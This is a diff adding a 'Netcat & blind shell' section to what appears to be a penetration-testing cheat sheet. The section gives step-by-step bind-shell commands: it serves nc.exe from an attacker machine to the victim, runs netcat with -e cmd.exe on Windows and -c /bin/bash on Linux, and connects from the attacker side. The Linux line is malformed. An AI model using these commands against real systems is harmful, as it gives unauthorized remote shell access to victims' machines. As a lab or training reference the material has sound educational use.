@@ -3189,7 +3189,36 @@ armitage
 
 
 
-#### Fixing Exploits
-```shell
+#### Netcat & blind shell
 
+```shell
+nc -nvlp <port>
 ```
+> list that given port
+
+- first we send the nc.exe to the target system
+- `/usr/share/windows-binaries` is the path of nc.exe and use `python -m SimpleHTTPServer 80` then open target browser entry attacker ip and download nc.exe
+
+- **for Window**
+
+```shell
+nc.exe -nvlp 1234 -e cmd.exe
+```
+> run on victum system cmd (window)
+
+```shell
+nc -nv <target-IP> 1234
+```
+> run this on attacker system to get the remote access of victum
+
+- **for linux**
+
+```shell
+nc.exe -n nvlp 1234 -c /bin/bash
+```
+> run on victum system cmd (linux system)
+
+```shell
+nc -nv <target-IP> 1234
+```
+> run this on attacker system to get the remote access of victum
